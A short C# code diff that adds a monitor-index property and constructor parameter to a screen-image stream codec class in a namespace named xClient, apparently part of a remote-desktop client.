@@ -24,6 +24,8 @@ namespace xClient.Core.Helper
             }
         }
 
+        public int Monitor { get; private set; }
+
         public Size CheckBlock { get; private set; }
         private byte[] _encodeBuffer;
         private Bitmap _decodedBitmap;
@@ -49,10 +51,11 @@ namespace xClient.Core.Helper
         /// Initialize a new object of UnsafeStreamCodec
         /// </summary>
         /// <param name="imageQuality">The quality to use between 0-100</param>
-        public UnsafeStreamCodec(int imageQuality = 100)
+        public UnsafeStreamCodec(int imageQuality, int monitor)
         {
             this.CheckBlock = new Size(50, 1);
             this.ImageQuality = imageQuality;
+            this.Monitor = monitor;
         }
 
         public unsafe void CodeImage(IntPtr scan0, Rectangle scanArea, Size imageSize, PixelFormat format, Stream outStream)
